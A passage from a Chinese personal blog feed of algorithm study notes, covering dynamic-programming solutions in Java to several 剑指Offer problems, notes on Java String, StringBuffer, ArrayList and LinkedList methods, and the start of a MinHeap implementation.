<span class="title function_">maxProfit</span><span class="params">(<span class="type">int</span>[] prices)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (prices.length == <span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">min</span> <span class="operator">=</span> prices[<span class="number">0</span>];</span><br><span class="line">        <span class="type">int</span> <span class="variable">max</span> <span class="operator">=</span> prices[<span class="number">0</span>];</span><br><span class="line">        <span class="type">int</span> money;</span><br><span class="line">        <span class="type">int</span> <span class="variable">maxmoney</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i&lt; prices.length; i++)&#123;</span><br><span class="line">            <span class="keyword">if</span> (min &gt; prices[i]) &#123;</span><br><span class="line">                min = prices[i];</span><br><span class="line">                max = <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (max &lt; prices[i])&#123;</span><br><span class="line">                max = prices[i];</span><br><span class="line">                money = max - min;</span><br><span class="line">                <span class="keyword">if</span> (maxmoney &lt; money) maxmoney = money;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> maxmoney;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>个人觉得自己的逻辑能力还不错，夸奖自己一波，实际上自己的逻辑还不是最佳的，最佳的方法不需要这么多的变量来储存值。但这题考察的内容是动态规划，所以面试的时候最佳做法还是动态规划，要学会使用。</p><p><strong>动态规划解析：</strong><br>状态定义： 设动态规划列表 dp ，dp[i]代表以 prices[i]为结尾的子数组的最大利润（以下简称为 前 i 日的最大利润 ）。</p><p>转移方程： 由于题目限定 “买卖该股票一次” ，因此前 i 日最大利润 dp[i]等于前 i - 1日最大利润 dp[i-1] 和第 i 日卖出的最大利润中的最大值。</p><p>前 i 日最大利润 &#x3D; max(前 (i-1) 日最大利润, 第 i 日价格 - 前 i 日最低价格)<br>dp[i] &#x3D; max(dp[i - 1], prices[i] - min(prices[0:i]))</p><p>初始状态： dp[0] &#x3D; 0 ，即首日利润为 0 ；<br>返回值： dp[n - 1] ，其中 n 为 dp 列表长度。</p><p><strong>效率优化：</strong><br>时间复杂度降低： 前 i 日的最低价格 min(prices[0:i]) 时间复杂度为 O(i) 。而在遍历 prices 时，可以借助一个变量（记为成本 cost ）每日更新最低价格。优化后的转移方程为：<br>dp[i]&#x3D;max(dp[i−1],prices[i]−min(cost,prices[i])</p><p>空间复杂度降低： 由于 dp[i] 只与 dp[i−1] ,prices[i] , cost 相关，因此可使用一个变量（记为利润 profit ）代替 dp 列表。优化后的转移方程为：<br>profit&#x3D;max(profit,prices[i]−min(cost,prices[i])</p><p><strong>代码</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">maxProfit</span><span class="params">(<span class="type">int</span>[] prices)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">cost</span> <span class="operator">=</span> Integer.MAX_VALUE, profit = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> price : prices) &#123;</span><br><span class="line">            cost = Math.min(cost, price);</span><br><span class="line">            profit = Math.max(profit, price - cost);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> profit;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="剑指-Offer-42-连续子数组的最大和"><a href="#剑指-Offer-42-连续子数组的最大和" class="headerlink" title="剑指 Offer 42. 连续子数组的最大和"></a>剑指 Offer 42. 连续子数组的最大和</h3><p>输入一个整型数组，数组中的一个或连续多个整数组成一个子数组。求所有子数组的和的最大值。<br>要求时间复杂度为O(n)。<br><img src="/upload/2022/02/image-7294b73bc4d6406a91e4927d5041f147.png" alt="image.png"></p><p>这题其他的方法比较难想到，动态规划是解法之一，因为不熟悉动态规划所以这题没做出来。完全没思路，只能学习看题解。</p><p><strong>动态规划解析：</strong><br>状态定义： 设动态规划列表 dp，dp[i] 代表以元素 nums[i] 为结尾的连续子数组最大和。<br>为何定义最大和 dp[i] 中必须包含元素 nums[i]：保证 dp[i]递推到 dp[i+1]的正确性；如果不包含 nums[i]，递推时则不满足题目的 <em>连续子数组</em> 要求。</p><p>转移方程： 若 dp[i−1]≤0 ，说明dp[i−1] 对 dp[i] 产生负贡献，即 dp[i−1]+nums[i] 还不如 nums[i] 本身大。<br>当 dp[i - 1] &gt; 0时：执行 dp[i]&#x3D;dp[i−1]+nums[i] ；<br>当 dp[i − 1] ≤ 0 时：执行 dp[i] &#x3D; nums[i] ；</p><p>初始状态： dp[0] &#x3D; nums[0]，即以 nums[0]结尾的连续子数组最大和为 nums[0]。</p><p>返回值： 返回 dp 列表中的最大值，代表全局最大值。</p><p><img src="/upload/2022/02/image-a413773a98084e1e860e3376ebab2639.png" alt="image.png"></p><p><strong>空间复杂度降低：</strong><br>由于 dp[i] 只与 dp[i-1] 和 nums[i]有关系，因此可以将原数组 nums 用作 dp 列表，即直接在 nums 上修改即可。<br>由于省去 dp 列表使用的额外空间，因此空间复杂度从 O(N) 降至 O(1) 。<br>如果不然修改原数组，也可以使用两个变量存储dp[i-1] 和 nums[i]的值，同样也可以做到O(1)的空间复杂度。</p><p><strong>代码</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">maxSubArray</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> nums[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; nums.length; i++) &#123;</span><br><span class="line">            nums[i] += Math.max(nums[i - <span class="number">1</span>], <span class="number">0</span>);</span><br><span class="line">            res = Math.max(res, nums[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="剑指-Offer-46-把数字翻译成字符串"><a href="#剑指-Offer-46-把数字翻译成字符串" class="headerlink" title="剑指 Offer 46. 把数字翻译成字符串"></a>剑指 Offer 46. 把数字翻译成字符串</h3><p>给定一个数字，我们按照如下规则把它翻译为字符串：0 翻译成 “a” ，1 翻译成 “b”，……，11 翻译成 “l”，……，25 翻译成 “z”。一个数字可能有多个翻译。请编程实现一个函数，用来计算一个数字有多少种不同的翻译方法。<br><img src="/upload/2022/02/image-fece69028dc74ec0b1bf96f0453f08dd.png" alt="image.png"></p><p>题解思路（如何写出动态规划状态方程的）：<br><img src="/upload/2022/02/image-96a9ace7548c471b9436fb2dc5849569.png" alt="image.png"></p><p><strong>动态规划解析：</strong><br>记数字 num 第 i 位数字为 xi，数字 num 的位数为 n ；<br>例如： num &#x3D; 12258 的 n&#x3D;5 , x1 &#x3D; 1</p><p>状态定义： 设动态规划列表 dp ，dp[i] 代表以 xi为结尾的数字的翻译方案数量。</p><p>转移方程： 若 xi和 x(i−1)组成的两位数字可以被翻译，则 dp[i] &#x3D; dp[i - 1] + dp[i - 2] ；否则 dp[i] &#x3D; dp[i - 1] 。<br>可被翻译的两位数区间：当 x(i−1)&#x3D;0 时，组成的两位数是无法被翻译的（例如 00, 01, 02,⋯ ），因此区间为 [10, 25] 。<br><img src="/upload/2022/02/image-d5f7d798ba6f41839bb2468883efc9fe.png" alt="image.png"><br>初始状态： dp[0] &#x3D; dp[1] &#x3D; 1，即 “无数字” 和 “第 1 位数字” 的翻译方法数量均为 1 ；</p><p>返回值： dp[n] ，即此数字的翻译方案数量。</p><p>Q： 无数字情况 dp[0] &#x3D; 1 从何而来？<br>A： 当 num第 1, 2 位的组成的数字 ∈[10,25] 时，显然应有 2 种翻译方法，即 dp[2] &#x3D; dp[1] + dp[0] &#x3D; 2 ，而显然 dp[1] &#x3D; 1，因此推出 dp[0] &#x3D; 1。</p><p><strong>解法一：字符串遍历</strong><br>为方便获取数字的各位 xi，考虑先将数字 num 转化为字符串 s ，通过遍历 s 实现动态规划。<br>通过字符串切片 s[i - 2:i] 获取数字组合 10x(i−1)+xi，通过对比字符串 ASCII 码判断字符串对应的数字区间。</p><p>空间使用优化： 由于 dp[i]只与 dp[i−1] 有关，因此可使用两个变量 a,b 分别记录 dp[i],dp[i−1] ，两变量交替前进即可。此方法可省去 dp 列表使用的 O(N)的额外空间。</p><p>代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">translateNum</span><span class="params">(<span class="type">int</span> num)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> String.valueOf(num);</span><br><span class="line">        <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> <span class="number">1</span>, b = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">2</span>; i &lt;= s.length(); i++) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">tmp</span> <span class="operator">=</span> s.substring(i - <span class="number">2</span>, i);</span><br><span class="line">            <span class="type">int</span> <span class="variable">c</span> <span class="operator">=</span> tmp.compareTo(<span class="string">&quot;10&quot;</span>) &gt;= <span class="number">0</span> &amp;&amp; tmp.compareTo(<span class="string">&quot;25&quot;</span>) &lt;= <span class="number">0</span> ? a + b : a;</span><br><span class="line">            b = a;</span><br><span class="line">            a = c;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> a;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>解法二：数字取余</strong><br>空间复杂度优化：<br>利用求余运算 num%10 和求整运算 num&#x2F;&#x2F;10 ，可获取数字num 的各位数字（获取顺序为个位、十位、百位…）。<br>因此，可通过 求余 和 求整 运算实现 从右向左 的遍历计算。<br>自此，字符串 s 的空间占用也被省去，空间复杂度从 O(N) 降至 O(1) 。</p><p>代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">translateNum</span><span class="params">(<span class="type">int</span> num)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> <span class="number">1</span>, b = <span class="number">1</span>, x, y = num % <span class="number">10</span>;</span><br><span class="line">        <span class="keyword">while</span>(num != <span class="number">0</span>) &#123;</span><br><span class="line">            num /= <span class="number">10</span>;</span><br><span class="line">            x = num % <span class="number">10</span>;</span><br><span class="line">            <span class="type">int</span> <span class="variable">tmp</span> <span class="operator">=</span> <span class="number">10</span> * x + y;</span><br><span class="line">            <span class="type">int</span> <span class="variable">c</span> <span class="operator">=</span> (tmp &gt;= <span class="number">10</span> &amp;&amp; tmp &lt;= <span class="number">25</span>) ? a + b : a;</span><br><span class="line">            b = a;</span><br><span class="line">            a = c;</span><br><span class="line">            y = x;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> a;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>数据结构与算法学习</category>
      
    </categories>
    
    
    <tags>
      
      <tag>动态规划</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>字符串 String</title>
    <link href="/2023/06/18/%E5%AD%97%E7%AC%A6%E4%B8%B2%20String/"/>
    <url>/2023/06/18/%E5%AD%97%E7%AC%A6%E4%B8%B2%20String/</url>
    
    <content type="html"><![CDATA[<h2 id="字符串的常用方法"><a href="#字符串的常用方法" class="headerlink" title="字符串的常用方法"></a>字符串的常用方法</h2><ul><li><p>字符串的创建：<br>String类是不可改变的，一旦创建了一个String对象，它的值就不能改变了。<br>如果想对字符串做修改，需要使用StringBuffer&amp;StringBuilder类。<br>&#x2F;&#x2F;直接创建方式<br>String str1 &#x3D; “abc”;<br>&#x2F;&#x2F;提供一个 字符数组 参数来初始化字符串<br>char[] strarray &#x3D; {‘a’,’b’,’c’};<br>String str2 &#x3D; new String(strarray);</p></li><li><p>字符串长度获取<br>int length()方法：返回字符串对象包含的字符数。</p></li><li><p>连接字符串<br> String concat(String str)：连接两个字符串的方法<br>或者直接用加号连接 str1+str2; </p></li><li><p>字符串查找<br>int indexOf(String s)：字符串s在指定字符串中首次出现的索引位置，如果没有检索到字符串s，该方法返回-1<br>int lastIndexOf(String s)：字符串s在指定字符串中最后一次出现的索引位置，如果没有检索到字符串s，该方法返回-1；如果s是空字符串，则返回的结果与length方法的返回结果相同，即返回整个字符串的长度。</p></li><li><p>获取指定位置的字符串<br>char charAt(int index)方法：返回指定索引出的字符</p></li><li><p>获取子字符串（切片）<br>String substring()方法：实现截取字符串，利用字符串的下标索引来截取(字符串的下标是从0开始的，在字符串中空格占用一个索引位置)<br>substring(int beginIndex)：截取从指定索引位置开始到字符串结尾的子串<br>substring(int beginIndex, int endIndex)：从beginIndex开始，到endIndex结束(不包括endIndex)</p></li><li><p>去除字符串首尾的空格<br>String trim()方法</p></li><li><p>字符串替换<br>String replace(char oldChar, char newChar)：将指定的字符&#x2F;字符串oldchar全部替换成新的字符&#x2F;字符串newChar<br>String replaceAll(String regex, String replacement)：使用给定的参数 replacement替换字符串所有匹配给定的正则表达式的子字符串<br>String replaceFirst(String regex, String replacement)：使用给定replacement 替换此字符串匹配给定的正则表达式的第一个子字符串<br>regex是正则表达式，替换成功返回替换的字符串，替换失败返回原字符串</p></li><li><p>判断字符串是否相等<br>boolean equals(Object anObject)：将此字符串与指定的对象比较，区分大小写<br>boolean equalsIgnoreCase(String anotherString)：将此 String 与另一个 String 比较，不考虑大小写</p></li><li><p>字符转化为ASCII码进行比较<br>int compareTo ：这个方法本来是比较数的大小的，但是Java String也能比较，是先将其中的字符串转化为ASCII码（二进制）再进行比较。两位数的ASCII码会先比较十位数的。<br>如果指定的数与参数相等返回0。<br>如果指定的数小于参数返回 -1。<br>如果指定的数大于参数返回 1。</p></li><li><p>字符大小写转换<br>String toLowerCase()：将字符串中的所有字符从大写字母改写为小写字母<br>String toUpperCase()：将字符串中的所有字符从小写字母改写为大写字母</p></li><li><p>字符串分割<br>String[] split()：根据匹配给定的正则表达式来拆分字符串，将分割后的结果存入字符数组中。<br>String[] split(String regex)：regex为正则表达式分隔符, . 、 $、 | 和 * 等转义字符，必须得加 \；多个分隔符，可以用 | 作为连字符。<br>String[] split(String regex, int limit)：limit为分割份数</p></li></ul><h2 id="字符串和其他数据类型的转换"><a href="#字符串和其他数据类型的转换" class="headerlink" title="字符串和其他数据类型的转换"></a>字符串和其他数据类型的转换</h2><ul><li><p>String转int型<br>&#x2F;&#x2F;第一种<br>int i &#x3D; Integer.parseInt(String str)<br>&#x2F;&#x2F;第二种<br>int i &#x3D; Integer.valueOf(s).intValue();</p></li><li><p>String转long型：<br>long l &#x3D; Long.parseLong(String str);</p></li><li><p>String转double型：<br>double d &#x3D; Double.valueOf(String str).doubleValue();&#x2F;&#x2F;doubleValue()不要也可<br>double d &#x3D; Double.parseDouble(str);</p></li><li><p>int转String型：<br>&#x2F;&#x2F;第一种<br>String s &#x3D; String.valueOf(i)；<br>valueOf()这个方法返回值是原对象，可以使用String.valueOf(),也可以使用Integer.valueOf()。若i为null，则返回字符串”null”.这个方法是静态方法，不需要实例对象<br>&#x2F;&#x2F;第二种<br>String s &#x3D; Integer.toString(i);<br>&#x2F;&#x2F;第三种<br>String s &#x3D; “” + i;</p></li><li><p>char转String：<br>基础数据类型不是对象，没有toString()方法，所以要进行转化时用String.valueOf()进行转换</p></li><li><p>char的封装类为Character<br>-&#x2F;&#x2F; 原始字符 ‘a’ 装箱到 Character 对象 ch 中<br>Character ch &#x3D; ‘a’;<br>&#x2F;&#x2F; 原始字符 ‘x’ 用 test 方法装箱<br>char c &#x3D; test(‘x’);</p></li><li><p>String转char数组：<br>public String(char[] value) ：通过char[]数组来创建字符串<br>char[] toCharArray()：将此字符串转换为一个新的字符数组。</p></li><li><p>String转byte数组：<br>byte[] getBytes()：使用平台的默认字符集将此 String 编码为 byte 序列，并将结果存储到一个新的 byte 数组中。<br>byte[] getBytes(String charsetName)：使用指定的字符集将此 String 编码为 byte 序列，并将结果存储到一个新的 byte 数组中</p></li></ul><p>数组之间一般是没法进行强制转换的，String数组可以转化成Object数组再转回来，而一开始就声明的Object数组没法转化为String数组，数组类型转化最好用遍历的方法。</p><h2 id="字符串的解题技巧"><a href="#字符串的解题技巧" class="headerlink" title="字符串的解题技巧"></a>字符串的解题技巧</h2><p>当题目需要统计字符串中字符出现数量时，可以利用整数数组创建字典，将字符串转化为从0开始的整数，方法为：s.charAt(i) - ‘a’<br>这里的思路是字符是可以直接根据ASCII码转化为整数的，int s &#x3D; ‘a’，那么输出的将是97. A的ASCII码为65.</p><h2 id="StringBuffer-StringBuilder类"><a href="#StringBuffer-StringBuilder类" class="headerlink" title="StringBuffer&amp;StringBuilder类"></a>StringBuffer&amp;StringBuilder类</h2><p>与String类最大的不同在于这两个类可以对字符串进行修改。<br>StringBuilder相较StringBuffer来说速度较快，多数情况下使用StringBuilder，但是StringBuilder的方法不是线性安全的（不能同步访问），所以在应用程序要求线程安全的情况下，必须使用StringBuffer。</p><ul><li><p>创建StringBuffer字符串<br>StringBuffer str &#x3D; new StringBuffer(“”);</p></li><li><p>添加字符(最常用方法)<br>public StringBuffer append(String s)：将指定的字符串追加到字符序列中</p></li><li><p>删除字符串中的指定字符<br>public delete(int start,int end)：移除此序列中的子字符串的内容<br>public deleteCharAt(int i)：删除指定位置的字符</p></li><li><p>翻转字符串<br>public StringBuffer reverse()</p></li><li><p>替换字符串中内容<br>replace(int start,int end,String str)：用String类型的字符串str替换此字符串的子字符串中的内容</p></li><li><p>插入字符<br>public insert(int offset, int i)：将int参数形式的字符串表示形式插入此序列中</p></li><li><p>字符串长度<br>int length()：返回长度（字符数）<br>void setLength(int new Length)：设置字符序列的长度</p></li><li><p>将其转变为String<br>String toString()</p></li><li><p>设置指定索引处的字符<br>void setCharAt(int index，char ch)：将给定索引处的字符设置为ch</p></li></ul>]]></content>
    
    
    <categories>
      
      <category>数据结构与算法学习</category>
      
    </categories>
    
    
    <tags>
      
      <tag>字符串</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>数据结构 List</title>
    <link href="/2023/06/18/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%20List/"/>
    <url>/2023/06/18/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%20List/</url>
    
    <content type="html"><![CDATA[<h2 id="List介绍"><a href="#List介绍" class="headerlink" title="List介绍"></a>List介绍</h2><p>list 这个数据结构中文译名还不少，不同的名字还让我迷糊过一阵，有些文章称为<strong>链表</strong>（但链表完整英文应该是linked-list）；在学习python的过程中也有这个数据结构，当时是把它称为<strong>列表</strong>，用于存储一组元素；Java中一般称其为<strong>线性表</strong>，这个是比较规范的，<strong>线性表有两种实现方式，顺序存储（ArrayList）和链式存储（LinkedList）</strong>，因为我的方向基本确定为JAVA路线，所以文章以JAVA方面进行记载。</p><p>通过查看源码，可以得到List接口继承了Collection（集合）接口，而Collection接口继承了Iterable（迭代器）接口。<br><img src="/upload/2022/02/image-436e32b4fab84c7fa291b2f1c0be42d7.png" alt="image.png"></p><h2 id="ArrayList"><a href="#ArrayList" class="headerlink" title="ArrayList"></a>ArrayList</h2><p>ArrayList底层是用数组实现的，它是一个可以动态修改的数组，与普通数组的区别就是它是没有固定大小的限制，我们可以添加或删除元素。</p><p>看了一下源码，基本就是增删改查的实现，很繁琐，以及一些自己从没见过的方法的实现，感觉没必要放上来。接着又去菜鸟教程看了一下，觉得里面整理后的常用方法比较重要，整理如下：<br>添加元素.add(#值)<br>访问元素.get(#下标)<br>修改元素.set(#下标，#值)<br>删除元素.remove(#下标)<br>数组大小.size()<br>数组排序.sort(#数组名)<br>返回元素的索引值.indexOf(#值)</p><p>ArrayList集合转换成数组<br>以int类型为例，使用List接口的toArray()方法。</p><p>用法1：Object[] toArray();<br>用法2：<T> T[] toArray(T[] a);</p><p>Integer[] Array  &#x3D; arraylist.toArray(new Integer[intArray.size()]);<br>这里无法转化为int数组，要转化的话只能使用循环遍历赋值</p><h2 id="LinkedList"><a href="#LinkedList" class="headerlink" title="LinkedList"></a>LinkedList</h2><p>链表（Linked list）是一种常见的基础数据结构，是一种线性表，但是并不会按线性的顺序存储数据，而是在每一个节点里存到下一个节点的地址。</p><p>链表可分为单向链表和双向链表。<br>一个单向链表包含两个值: 当前节点的值和一个指向下一个节点的链接。<br>一个双向链表有三个整数值: 数值、向后的节点链接、向前的节点链接。<br>与 ArrayList 相比，LinkedList 的增加和删除的操作效率更高，而查找和修改的操作效率较低。<br>单向链表的结构如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ListNode</span> &#123;</span><br><span class="line">    <span class="type">int</span> val;</span><br><span class="line">    ListNode next;</span><br><span class="line">    ListNode() &#123;&#125;</span><br><span class="line">    ListNode(<span class="type">int</span> val) &#123; <span class="built_in">this</span>.val = val; &#125;</span><br><span class="line">    ListNode(<span class="type">int</span> val, ListNode next) &#123; <span class="built_in">this</span>.val = val; <span class="built_in">this</span>.next = next; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>LinkedList常用方法整理如下：<br>添加元素.add(#值)<br>访问元素.get(#下标)<br>在头部添加元素.addFirst(#值)<br>在尾部添加元素.addLast(#值)<br>移除头部元素.removeFirst()<br>移除尾部元素.removeLast()<br>获取头部元素.getFirst()<br>获取尾部元素.getLast()<br>数组大小.size()</p><p>个人学习小结，其中可能有错误，还望在下方评论指出  &#x3D; V &#x3D;</p>]]></content>
    
    
    <categories>
      
      <category>数据结构与算法学习</category>
      
    </categories>
    
    
    <tags>
      
      <tag>链表</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>最小堆 MinHeap</title>
    <link href="/2023/06/18/%E6%9C%80%E5%B0%8F%E5%A0%86%20MinHeap%20/"/>
    <url>/2023/06/18/%E6%9C%80%E5%B0%8F%E5%A0%86%20MinHeap%20/</url>
    
    <content type="html"><![CDATA[<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>堆是用数组实现的完全二叉树，分为两种，最大堆和最小堆。这种数据结构内存的占用会比树少很多，并且堆中数据的组织方式可以保证O(log n) 的性能。在时间和空间上都很高效。一个最大堆可以这样储存[10, 7, 2, 5, 1]，根据完全二叉树的公式就可以得到节点对应的位置。</p><h2 id="堆的代码实现"><a href="#堆的代码实现" class="headerlink" title="堆的代码实现"></a>堆的代码实现</h2><p>本文用Java代码实现最小堆和堆的基本操作</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MinHeap</span> &#123;</span><br><span class="line"><span class="keyword">private</span> <span class="type">int</span>[] heap;  <span class="comment">// 将所有元素以完全二叉树的形式存入数组</span></span><br><span class="line"><span class="keyword">private</span> <span class="type">int</span> size;  <span class="comment">// 堆中元素的个数</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">MinHeap</span><span class="params">(<span class="type">int</span> maxSize)</span> &#123;</span><br><span class="line">heap = <span class="keyword">new</span> <span class="title class_">int</span>[maxSize];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 基于数组构造最小堆</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">MinHeap</span><span class="params">(<span class="type">int</span>[] arr, <span class="type">int</span> maxSize)</span> &#123;</span><br><span class="line">heap = <span class="keyword">new</span> <span class="title class_">int</span>[maxSize &gt; arr.length ? maxSize : arr.length];</span><br><span class="line">System.arraycopy(arr, <span class="number">0</span>, heap, <span class="number">0</span>, arr.length);</span><br><span class="line">size = arr.length;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="variable">pos</span> <span class="operator">=</span> (size - <span class="number">2</span>) / <span class="number">2</span>; <span class="comment">// 最初调整位置：最后的分支节点(最后叶节点的父亲)</span></span><br><span class="line"><span class="keyword">while</span> (pos &gt;= <span class="number">0</span>) &#123;    <span class="comment">//依次调整每个分支节点</span></span><br><span class="line">shiftDown(pos, size - <span class="number">1</span>);</span><br><span class="line">pos--;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 自上向下调整为最小堆(从不是最小堆调整为最小堆)，调整的前提是其左子树与右子树均为最小堆</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">shiftDown</span><span class="params">(<span class="type">int</span> start, <span class="type">int</span> end)</span> &#123;</span><br><span class="line"><span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> start;       <span class="comment">// 起始调整位置，分支节点</span></span><br><span class="line"><span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">2</span> * start + <span class="number">1</span>;  <span class="comment">// 该分支节点的子节点</span></span><br><span class="line"><span class="type">int</span> <span class="variable">temp</span> <span class="operator">=</span> heap[i];   </span><br><span class="line"><span class="keyword">while</span> (j &lt;= end) &#123;  <span class="comment">// 迭代条件：子节点不能超出end(范围)</span></span><br><span class="line"><span class="keyword">if</span> (j &lt; end) &#123; </span><br><span class="line">j = heap[j] &gt; heap[j + <span class="number">1</span>] ? j + <span class="number">1</span> : 